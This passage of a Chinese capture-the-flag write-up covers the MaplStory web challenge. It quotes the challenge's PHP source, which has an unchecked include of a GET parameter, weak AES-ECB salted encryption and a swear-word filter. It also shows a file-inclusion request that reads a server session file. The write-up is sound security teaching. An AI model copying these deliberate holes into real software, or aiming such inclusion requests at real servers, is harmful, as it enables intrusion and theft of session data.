href=https://xz.aliyun.com/t/2463>先知社区</a> ，转载请注明链接。</strong></p><p>本题考察PHP源码审计。主要有两个缺陷：使用ECB模式进行AES加密导致的CPA（选择明文攻击）和 文件包含。有两处可以向文件写入内容以供包含，但均被过滤，最终通过以未被过滤的Cookie为跳板连接两处文件包含来写入Shell。文末还介绍了一种深入利用一处文件包含getshell的解法。</p><h1 id=概览>概览<a hidden class=anchor aria-hidden=true href=#概览>#</a></h1><p>打开 http://178.128.87.16 是一个登陆页面，注册账户后有四个页面，<code>HOME</code> 是欢迎页，<code>CHARACTER</code> 页可以和宠物角色互动，但账户刚注册完是没有宠物的，需要获取ADMIN权限后自行添加， <code>SETTING</code> 页可以修改用户名和选择头像，<code>GAME</code> 页是一个Flash小游戏，和本题无关。</p><p>题目提供了源码下载，可以从 <a href=https://ctf.meepwn.team/attachments/web/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip>这里</a> 或 <a href=https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/MaplStory_f7056ad79428f636ca4e92f283727818ecc0dd70ecb95f8a12e2764df0946022.zip>备用地址</a> 下载。</p><p><img loading=lazy src=b7f6a40eb0199da3d.png alt></p><h1 id=文件包含>文件包含<a hidden class=anchor aria-hidden=true href=#文件包含>#</a></h1><h2 id=indexphp>index.php<a hidden class=anchor aria-hidden=true href=#indexphp>#</a></h2><p><code>index.php</code> 文件中有如下语句，显然存在文件包含。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>include</span>($_GET[<span style=color:#e6db74>&#39;page&#39;</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>但所有 <code>GET</code> 和<code>POST</code> 提交的参数都会被删除掉敏感字符串，其中 <code>//</code> 、<code>(.+)</code> 和<code> ``</code> 是比较值得注意的。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-22>22</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>bad_words</span>($value)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#75715e>//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	$too_bad<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&#34;</span>;
</span></span><span style=display:flex><span>	$value <span style=color:#f92672>=</span> <span style=color:#a6e22e>preg_replace</span>($too_bad, <span style=color:#a6e22e>str_repeat</span>(<span style=color:#e6db74>&#34;*&#34;</span>,<span style=color:#ae81ff>3</span>) ,$value);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> $value;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_GET <span style=color:#66d9ef>as</span> $key<span style=color:#f92672>=&gt;</span>$value)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_array</span>($value)){<span style=color:#a6e22e>mapl_die</span>();}
</span></span><span style=display:flex><span>	$value<span style=color:#f92672>=</span><span style=color:#a6e22e>bad_words</span>($value);
</span></span><span style=display:flex><span>	$_GET[$key]<span style=color:#f92672>=</span>$value;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>foreach</span>($_POST <span style=color:#66d9ef>as</span> $key2<span style=color:#f92672>=&gt;</span>$value2)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_array</span>($value2)){<span style=color:#a6e22e>mapl_die</span>();}
</span></span><span style=display:flex><span>	$value2<span style=color:#f92672>=</span><span style=color:#a6e22e>bad_words</span>($value2);
</span></span><span style=display:flex><span>	$_POST[$key2]<span style=color:#f92672>=</span>$value2;
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>PHP使用PHPSESSID cookie值 存储会话标识，一般在<code>/var/lib/php/sessions/sess_&lt;PHPSESSID></code> 文件里写有一些有特定意义的字符串，其中<code>&lt;PHPSESSID></code> 可在Cookie里找到。尝试读取SESSION文件：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#ae81ff>178.128</span><span style=color:#f92672>.</span><span style=color:#ae81ff>87.16</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>page</span><span style=color:#f92672>=/</span><span style=color:#66d9ef>var</span><span style=color:#f92672>/</span><span style=color:#a6e22e>lib</span><span style=color:#f92672>/</span><span style=color:#a6e22e>php</span><span style=color:#f92672>/</span><span style=color:#a6e22e>sessions</span><span style=color:#f92672>/</span><span style=color:#a6e22e>sess_8es749ivbfetvsmsc0ggthr2e5</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=10ba83b332274e312.png alt></p><p>其中是序列化后的<code>$_SESSION</code> 和明文的操作记录，这些内容在后面会大有用处。</p><h1 id=cpa猜解salt>CPA猜解salt<a hidden class=anchor aria-hidden=true href=#cpa猜解salt>#</a></h1><h2 id=loginphp>login.php<a hidden class=anchor aria-hidden=true href=#loginphp>#</a></h2><p>阅读<code>login.php</code> 并跟入相关文件，可以看到有多处用到<code>$salt</code> 变量，其地位非常关键。</p><p>首先是从单独的表<code>mapl_config</code> 中读出值。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>    $configRow<span style=color:#f92672>=</span><span style=color:#a6e22e>config_connect</span>($conn);
</span></span><span style=display:flex><span>    $salt<span style=color:#f92672>=</span>$configRow[<span style=color:#e6db74>&#39;mapl_salt&#39;</span>];
</span></span><span style=display:flex><span>    $key<span style=color:#f92672>=</span>$configRow[<span style=color:#e6db74>&#39;mapl_key&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>    function config_connect($conn)
</span></span></span><span style=display:flex><span><span style=color:#75715e>    {
</span></span></span><span style=display:flex><span><span style=color:#75715e>        $config=mysqli_query($conn,&#34;SELECT * FROM mapl_config&#34;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>        return mysqli_fetch_array($config);
</span></span></span><span style=display:flex><span><span style=color:#75715e>    }
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></td></tr></table></div></div><p>如果登陆成功就将用户名和邮箱加盐加密存储的<code>$_SESSION</code> 变量里。并且将<code>admin</code> /<code>user</code> 字符串加盐加密存储在<code>$_COOKIE['_role']</code> 变量中，用以标识用户身份。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-31>31</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>( $count <span style=color:#f92672>===</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>&amp;&amp;</span> $row[<span style=color:#e6db74>&#39;userPass&#39;</span>]<span style=color:#f92672>===</span>$password ) <span style=color:#75715e>//登陆成功
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>			{
</span></span><span style=display:flex><span>				$secure_email<span style=color:#f92672>=</span><span style=color:#a6e22e>encryptData</span>($row[<span style=color:#e6db74>&#39;userEmail&#39;</span>],$salt,$key);
</span></span><span style=display:flex><span>				$secure_name<span style=color:#f92672>=</span><span style=color:#a6e22e>encryptData</span>($row[<span style=color:#e6db74>&#39;userName&#39;</span>],$salt,$key);
</span></span><span style=display:flex><span>				$log_content<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;[&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;h:i:sa&#34;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; GMT+7] Logged In&#39;</span>;
</span></span><span style=display:flex><span>				$_SESSION[<span style=color:#e6db74>&#39;character_name&#39;</span>] <span style=color:#f92672>=</span> $secure_name;
</span></span><span style=display:flex><span>				$_SESSION[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> $secure_email;
</span></span><span style=display:flex><span>    			$_SESSION[<span style=color:#e6db74>&#39;action&#39;</span>]<span style=color:#f92672>=</span>$log_content;
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>if</span> ($row[<span style=color:#e6db74>&#39;userIsAdmin&#39;</span>]<span style=color:#f92672>===</span><span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					$data<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;admin&#39;</span><span style=color:#f92672>.</span>$salt;
</span></span><span style=display:flex><span>					$role<span style=color:#f92672>=</span><span style=color:#a6e22e>hash</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, $data);
</span></span><span style=display:flex><span>					<span style=color:#a6e22e>setcookie</span>(<span style=color:#e6db74>&#39;_role&#39;</span>,$role);
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					$data<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;user&#39;</span><span style=color:#f92672>.</span>$salt;
</span></span><span style=display:flex><span>					$role<span style=color:#f92672>=</span><span style=color:#a6e22e>hash</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, $data);
</span></span><span style=display:flex><span>					<span style=color:#a6e22e>setcookie</span>(<span style=color:#e6db74>&#39;_role&#39;</span>,$role);					
</span></span><span style=display:flex><span>				}
</span></span><span style=display:flex><span>				<span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: ?page=home.php&#34;</span>);
</span></span><span style=display:flex><span>			} 
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>    function encryptData($data,$salt,$key)
</span></span></span><span style=display:flex><span><span style=color:#75715e>    {
</span></span></span><span style=display:flex><span><span style=color:#75715e>            $encrypt=openssl_encrypt($data.$salt,&#34;AES-128-ECB&#34;,$key);
</span></span></span><span style=display:flex><span><span style=color:#75715e>            $raw=base64_decode($encrypt);
</span></span></span><span style=display:flex><span><span style=color:#75715e>            $final=implode(unpack(&#34;H*&#34;, $raw));
</span></span></span><span style=display:flex><span><span style=color:#75715e>            return $final;
</span></span></span><span style=display:flex><span><span style=color:#75715e>    }
</span></span></span><span style=display:flex><span><span style=color:#75715e>*/</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=settingphp>setting.php<a hidden class=anchor aria-hidden=true href=#settingphp>#</a></h2><p>再查看<code>setting.php</code> ，这个文件实现了修改用户名页面的功能 。只要修改后的名字不长于22个字符，就使用<code>mysqli_real_escape_string</code> 处理并更新记录（避免SQL注入）。会被编码的字符有的 NUL（ASCII 0）、\n、\r、\、&rsquo;、" 和 Control-Z。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6> 6</a>
